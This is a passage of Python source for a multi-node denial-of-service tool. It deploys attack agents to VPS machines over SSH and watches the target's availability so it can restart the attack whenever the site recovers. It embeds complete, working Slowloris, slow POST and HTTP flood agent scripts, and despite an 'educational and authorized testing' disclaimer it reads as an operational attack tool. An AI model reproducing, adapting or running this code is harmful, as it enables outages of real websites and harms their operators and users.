                    logger.info(f"Target {target_url} is back online after {int(downtime)} seconds. Restarting attack.")
                    
                    # Log the event
                    self.db_manager.add_attack_result(
                        session_id,
                        "system",
                        0, 0, 0, 0, None, None,
                        json.dumps({"event": "target_back_online", "downtime": int(downtime)}),
                        'running'
                    )
                    
                    # Restart attack on all VPS
                    for vps_ip in attack_info['vps_list']:
                        self._attempt_restart_attack(session_id, vps_ip)
                    
                    target_available = True
                    target_unavailable_since = None
                    
                elif not available and target_available:
                    # Target just went down
                    logger.info(f"Target {target_url} is unavailable. Monitoring for recovery.")
                    target_available = False
                    target_unavailable_since = time.time()
                    
                    # Log the event
                    self.db_manager.add_attack_result(
                        session_id,
                        "system",
                        0, 0, 0, 0, None, None,
                        json.dumps({"event": "target_unavailable"}),
                        'running'
                    )
                
            except Exception as e:
                logger.error(f"Error monitoring target availability: {str(e)}")
            
            # Sleep before next check
            time.sleep(check_interval)
    
    def _check_target_availability(self, url):
        """Check if a target URL is available"""
        try:
            # Use socket for basic connection test
            parsed_url = urlparse(url)
            host = parsed_url.hostname
            port = parsed_url.port or (443 if url.startswith('https://') else 80)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, port))
            sock.close()
            
            return result == 0
        except Exception as e:
            logger.error(f"Error checking target availability: {str(e)}")
            return False
    
    def stop_attack(self, session_id):
        """Stop an attack across all VPS nodes with improved error handling"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            logger.warning(f"Attack {session_id} not found")
            return False
        
        logger.info(f"Stopping attack {session_id} on {len(attack_info['vps_list'])} VPS nodes")
        print(f"\n{Colors.YELLOW}[STOPPING] Attack {session_id} on {len(attack_info['vps_list'])} VPS nodes{Colors.RESET}")
        
        # Update attack status
        attack_info['status'] = 'stopping'
        
        # Track success/failure for each VPS
        results = {'success': [], 'failed': []}
        
        # Stop attack on each VPS
        for vps_ip in attack_info['vps_list']:
            print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
            
            try:
                # Get process ID if available
                process_id = attack_info['process_ids'].get(vps_ip)
                
                if process_id:
                    # Try to kill the specific process first
                    cmd = f"kill {process_id} 2>/dev/null || true"
                    self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                
                # Kill all agent.py processes as a fallback
                cmd = "pkill -f 'python3 agent.py' 2>/dev/null || true"
                success, _ = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                
                # Verify processes are stopped
                cmd = "pgrep -f 'python3 agent.py' || echo 'stopped'"
                verify_success, verify_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                
                if verify_success and verify_output.strip() == 'stopped':
                    print(f"{Colors.GREEN}STOPPED{Colors.RESET}")
                    results['success'].append(vps_ip)
                else:
                    # Try more aggressive kill
                    cmd = "pkill -9 -f 'python3 agent.py' 2>/dev/null || true"
                    self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                    
                    # Verify again
                    cmd = "pgrep -f 'python3 agent.py' || echo 'stopped'"
                    verify_success, verify_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
                    
                    if verify_success and verify_output.strip() == 'stopped':
                        print(f"{Colors.GREEN}STOPPED (forced){Colors.RESET}")
                        results['success'].append(vps_ip)
                    else:
                        print(f"{Colors.YELLOW}PARTIAL{Colors.RESET}")
                        results['failed'].append(vps_ip)
            except Exception as e:
                print(f"{Colors.RED}ERROR{Colors.RESET}")
                logger.error(f"Error stopping attack on {vps_ip}: {str(e)}")
                results['failed'].append(vps_ip)
        
        # Update attack status in database
        self.db_manager.update_attack_status(
            session_id, 
            'completed',
            json.dumps({
                "success_count": len(results['success']),
                "failed_count": len(results['failed']),
                "failed_vps": results['failed']
            })
        )
        
        # Remove from active attacks
        if session_id in self.active_attacks:
            del self.active_attacks[session_id]
        
        # Stop monitoring threads
        if session_id in self.monitoring_threads:
            # Threads will terminate on their own when they check active_attacks
            del self.monitoring_threads[session_id]
        
        print(f"\n{Colors.GREEN}[SUCCESS] Attack {session_id} stopped ({len(results['success'])}/{len(attack_info['vps_list'])} VPS nodes){Colors.RESET}")
        
        if results['failed']:
            print(f"{Colors.YELLOW}[WARNING] Failed to stop attack on {len(results['failed'])} VPS nodes{Colors.RESET}")
        
        return True
    
    def get_attack_status(self, session_id):
        """Get current status of an attack"""
        attack_info = self.active_attacks.get(session_id)
        if not attack_info:
            # Check database for completed attacks
            session = self.db_manager.get_attack_session(session_id)
            if session:
                return {
                    'status': session['status'],
                    'target_host': session['target_host'],
                    'target_url': session['target_url'],
                    'attack_type': session['attack_type'],
                    'start_time': session['start_time'],
                    'end_time': session['end_time']
                }
            return None
        
        # Get latest results for each VPS
        results = self.db_manager.get_attack_results(session_id)
        
        # Aggregate results
        total_connections = sum(r['connections_active'] for r in results if r['connections_active'] is not None)
        total_packets = sum(r['packets_sent'] for r in results if r['packets_sent'] is not None)
        total_bytes = sum(r['bytes_sent'] for r in results if r['bytes_sent'] is not None)
        total_errors = sum(r['error_count'] for r in results if r['error_count'] is not None)
        
        # Merge response codes
        response_codes = {}
        for result in results:
            if result['response_codes']:
                try:
                    codes = json.loads(result['response_codes'])
                    for code, count in codes.items():
                        if code not in response_codes:
                            response_codes[code] = 0
                        response_codes[code] += count
                except:
                    pass
        
        # Calculate duration
        start_time = attack_info['start_time']
        duration = (datetime.now() - start_time).total_seconds()
        
        return {
            'status': attack_info['status'],
            'target_host': attack_info['target_host'],
            'target_url': attack_info['target_url'],
            'attack_type': attack_info['attack_type'],
            'start_time': start_time,
            'duration': duration,
            'connections': total_connections,
            'packets': total_packets,
            'bytes': total_bytes,
            'errors': total_errors,
            'response_codes': response_codes,
            'vps_count': len(attack_info['vps_list'])
        }
    
    def _get_standard_agent_script(self):
        """Get the standard agent script"""
        return '''#!/usr/bin/env python3
"""
SlowHTTP Attack Agent - Standard Edition
For educational and authorized testing purposes only
"""

import socket
import random
import time
import sys
import argparse
import os
import signal
import threading
import json
from urllib.parse import urlparse

VERSION = "5.1.0"

class HTTPAttacker:
    def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/"):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.path = path
        self.running = False
        self.connections = []
        self.lock = threading.Lock()
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        # Generate random user agent if not provided
        if not user_agent:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
            ]
            self.user_agent = random.choice(user_agents)
        else:
            self.user_agent = user_agent
    
    def slowloris_attack(self, num_connections, delay, duration):
        """Slowloris (Keep-Alive) attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slowloris attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Send initial HTTP request headers (incomplete)
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Cache-Control: no-cache\\r\\n"
                    
                    # Send initial headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Keep connections alive by sending partial headers
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a partial header to keep connection alive
                        partial_header = f"X-a: {random.randint(1, 5000)}\\r\\n"
                        s.send(partial_header.encode())
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += len(partial_header)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Send initial HTTP request headers (incomplete)
                            request = f"GET {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Cache-Control: no-cache\\r\\n"
                            
                            # Send initial headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(new_s)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent, {self.stats['error_count']} errors")
                
                # Sleep before sending more headers
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def slow_post_attack(self, num_connections, delay, duration):
        """Slow POST attack (R.U.D.Y)"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slow POST attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Generate a random large content length
                    content_length = random.randint(10000000, 1000000000)
                    
                    # Send initial HTTP POST request headers
                    request = f"POST {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                    request += f"Content-Length: {content_length}\\r\\n"
                    request += "\\r\\n"
                    
                    # Send headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Store connection with bytes sent counter
                    self.connections.append({
                        "socket": s,
                        "bytes_sent": 0,
                        "content_length": content_length
                    })
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Send POST data very slowly
            while time.time() < end_time and self.running:
                for i, conn in enumerate(list(self.connections)):
                    try:
                        s = conn["socket"]
                        bytes_sent = conn["bytes_sent"]
                        content_length = conn["content_length"]
                        
                        # If we haven't sent all the data yet
                        if bytes_sent < content_length:
                            # Send a small piece of POST data
                            data_chunk = f"a={random.randint(1, 5000)}&"
                            s.send(data_chunk.encode())
                            
                            # Update bytes sent
                            conn["bytes_sent"] += len(data_chunk)
                            
                            # Update stats
                            with self.lock:
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(data_chunk)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(conn)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Generate a random large content length
                            content_length = random.randint(10000000, 1000000000)
                            
                            # Send initial HTTP POST request headers
                            request = f"POST {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                            request += f"Content-Length: {content_length}\\r\\n"
                            request += "\\r\\n"
                            
                            # Send headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append({
                                "socket": new_s,
                                "bytes_sent": 0,
                                "content_length": content_length
                            })
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent, {self.stats['error_count']} errors")
                
                # Sleep before sending more data
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def http_flood_attack(self, num_connections, requests_per_connection, duration):
        """HTTP Flood attack"""
        self.running = True
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting HTTP Flood attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Requests per connection: {requests_per_connection}, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        # Create thread pool
        threads = []
        
        # Function for each worker thread
        def worker():
            while time.time() < end_time and self.running:
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    with self.lock:
                        self.stats["connections_active"] += 1
                    
                    # Send multiple requests on the same connection
                    for _ in range(requests_per_connection):
                        if not self.running or time.time() >= end_time:
                            break
                        
                        try:
                            # Generate random query parameters to bypass cache
                            random_param = f"?r={random.randint(1, 1000000)}"
                            
                            # Send HTTP request
                            request = f"GET {self.path}{random_param} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Cache-Control: no-cache\\r\\n\\r\\n"
                            
                            # Send request
                            s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Try to read response code
                            try:
                                response = s.recv(1024).decode('utf-8', errors='ignore')
                                if response.startswith('HTTP/'):
                                    status_code = response.split(' ')[1]
                                    with self.lock:
                                        if status_code not in self.stats["response_codes"]:
                                            self.stats["response_codes"][status_code] = 0
                                        self.stats["response_codes"][status_code] += 1
                            except:
                                pass
                            
                        except Exception as e:
                            with self.lock:
                                self.stats["error_count"] += 1
                            break
                    
                    # Close connection
                    try:
                        s.close()
                    except:
                        pass
                    
                    with self.lock:
                        self.stats["connections_active"] -= 1
                    
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
        
        try:
            # Start worker threads
            for _ in range(num_connections):
                if not self.running:
                    break
                
                t = threading.Thread(target=worker)
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Monitor and report status
            while time.time() < end_time and self.running:
                # Print status update
                response_codes_str = ""
                if self.stats["response_codes"]:
                    codes = []
                    for code, count in self.stats["response_codes"].items():
                        codes.append(f"{code}: {count}")
                    response_codes_str = f", Response codes: {', '.join(codes)}"
                
                print(f"[*] Status: {self.stats['connections_active']} connections active, {self.stats['packets_sent']} packets sent, {self.stats['bytes_sent']} bytes sent, {self.stats['error_count']} errors{response_codes_str}")
                
                time.sleep(1)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def stop_attack(self):
        """Stop the attack and clean up connections"""
        self.running = False
        
        # Close all connections
        if hasattr(self, 'connections'):
            for conn in self.connections:
                try:
                    if isinstance(conn, dict) and 'socket' in conn:
                        conn['socket'].close()
                    else:
                        conn.close()
                except:
                    pass
            
            self.connections = []
        
        # Final stats update
        with self.lock:
            self.stats["connections_active"] = 0
        
        print(f"[*] Attack stopped. Final stats: {json.dumps(self.stats)}")

def main():
    parser = argparse.ArgumentParser(description="SlowHTTP Attack Agent")
    parser.add_argument("--target", help="Target hostname or IP")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    parser.add_argument("--path", default="/", help="Target path (default: /)")
    parser.add_argument("--attack-type", choices=["slowloris", "slow_post", "http_flood"], default="slowloris", help="Attack type")
    parser.add_argument("--connections", type=int, default=150, help="Number of connections (default: 150)")
    parser.add_argument("--delay", type=float, default=15, help="Delay between packets in seconds (default: 15)")
    parser.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
    parser.add_argument("--requests", type=int, default=1000, help="Requests per connection for HTTP flood (default: 1000)")
    parser.add_argument("--version", action="store_true", help="Show version and exit")
    
    args = parser.parse_args()
    
    if args.version:
        print(f"SlowHTTP Attack Agent v{VERSION}")
        sys.exit(0)
    
    if not args.target:
        parser.print_help()
        sys.exit(1)
    
    # Parse URL if full URL is provided
    if args.target.startswith(("http://", "https://")):
        parsed_url = urlparse(args.target)
        target_host = parsed_url.netloc
        use_ssl = args.target.startswith("https://")
        path = parsed_url.path if parsed_url.path else "/"
        port = parsed_url.port or (443 if use_ssl else 80)
    else:
        target_host = args.target
        use_ssl = args.ssl
        path = args.path
        port = args.port
    
    # Create attacker
    attacker = HTTPAttacker(target_host, port, use_ssl, path=path)
    
    try:
        # Launch attack based on type
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "http_flood":
            attacker.http_flood_attack(args.connections, args.requests, args.duration)
    except KeyboardInterrupt:
        print("\\n[INTERRUPTED] Stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop_attack()
    finally:
        print("[CLEANUP] Attack completed")

if __name__ == "__main__":
    main()
'''
    
    def _get_advanced_agent_script(self):
        """Get the advanced agent script with additional attack methods"""
        return '''#!/usr/bin/env python3
"""
SlowHTTP Attack Agent - Advanced Edition
For educational and authorized testing purposes only
"""

import socket
import random
import time
import sys
import argparse
import ssl
import os
import signal
import threading
import json
import struct
from urllib.parse import urlparse
import select

VERSION = "5.1.0"

class AdvancedHTTPAttacker:
    def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/"):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.path = path
        self.running = False
        self.connections = []
        self.lock = threading.RLock()  # Reentrant lock for thread safety
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        # Generate random user agent if not provided
        if not user_agent:
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
            ]
            self.user_agent = random.choice(user_agents)
        else:
            self.user_agent = user_agent
    
    def slowloris_attack(self, num_connections, delay, duration):
        """Slowloris (Keep-Alive) attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slowloris attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send initial HTTP request headers (incomplete)
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Cache-Control: no-cache\\r\\n"
                    
                    # Send initial headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(s)
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Keep connections alive by sending partial headers
            while time.time() < end_time and self.running:
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a partial header to keep connection alive
                        partial_header = f"X-a: {random.randint(1, 5000)}\\r\\n"
                        s.send(partial_header.encode())
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += len(partial_header)
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL if needed
                            if self.use_ssl:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Send initial HTTP request headers (incomplete)
                            request = f"GET {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += f"User-Agent: {self.user_agent}\\r\\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                            request += "Accept-Encoding: gzip, deflate\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "Cache-Control: no-cache\\r\\n"
                            
                            # Send initial headers
                            new_s.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(new_s)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before sending more headers
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def slow_post_attack(self, num_connections, delay, duration):
        """Slow POST attack (R.U.D.Y)"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting Slow POST attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Generate a random large content length
                    content_length = random.randint(10000000, 1000000000)
                    
                    # Send initial HTTP POST request headers
                    request = f"POST {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
                    request += f"Content-Length: {content_length}\\r\\n"
                    request += "\\r\\n"
                    
                    # Send headers
                    s.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Store connection with bytes sent counter
                    self.connections.append({
                        "socket": s,
                        "bytes_sent": 0,
                        "content_length": content_length
                    })
                    
                    # Sleep briefly between connections
                    if i % 100 == 0:
                        time.sleep(0.1)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 100 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} connections")
            
            # Send POST data very slowly
            while time.time() < end_time and self.running:
                for i, conn in enumerate(list(self.connections)):
                    try:
                        s = conn["socket"]
                        bytes_sent = conn["bytes_sent"]
                        content_length = conn["content_length"]
                        
                        # If we haven't sent all the data yet
                        if bytes_sent < content_length:
                            # Send a small piece of POST data
                            data_chunk = f"a={random.randint(1, 5000)}&"
                            s.send(data_chunk.encode())
                            
                            # Update bytes sent
                            conn["bytes_sent"] += len(data_chunk)
                            
                            # Update stats
                            with self.lock:
